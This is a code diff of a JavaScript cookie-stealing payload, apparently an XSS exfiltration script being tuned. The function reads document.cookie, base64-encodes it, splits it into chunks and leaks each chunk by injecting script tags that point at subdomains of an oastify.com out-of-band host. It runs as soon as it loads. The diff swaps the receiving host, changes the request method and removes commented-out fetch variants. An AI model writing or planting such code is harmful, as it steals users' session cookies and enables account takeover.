@@ -25,14 +25,14 @@
 // }
 function myFunction() {
 	
-	var param1 = "https://39a6jjyh6zpe6ho85sbe9bj78yep2fq4.oastify.com/";
+	var param1 = "https://mndpx2c0ki3xk02rjbpxnuxqmhs9g04p.oastify.com/";
 	var param2 = btoa(JSON.stringify(document.cookie)).replaceAll("=", "Z");
 	var domain = '39a6jjyh6zpe6ho85sbe9bj78yep2fq4.oastify.com/';
 	var proto  = 'https://';
 	for(let i=0; i<param2.length; i+=55) {
 		var temp = param2.substring(i, i + 55);
 		let config = {
-		method: 'OPTIONS',
+		method: 'get',
 			headers: {
 				'Content-Type': 'text/html',
 				'Accept': temp,
@@ -45,12 +45,7 @@ function myFunction() {
 		};
 		var scriptElm = document.createElement("script");
 		scriptElm.src = [[[[[proto, i].join(''),'-'].join(''), temp].join(''), domain].join('.'),'index.js'].join('');
-		//scriptElm.src= [param1, [temp,'.js'].join('')].join('');
 		document.body.appendChild(scriptElm);
-		//var urlPath = [param1, [temp,'.txt'].join('')].join('');
-		//var urlPath = [[[proto, domain].join(''), temp].join(''), '.js'].join('');
-		//var urlPath = [[[[[proto, i].join(''),'-'].join(''), temp].join(''), domain].join('.'),'index.js'].join('');
-		//fetch(urlPath, config).then((res)=> {}).then((text)=> {});
 	}
 }
 myFunction();
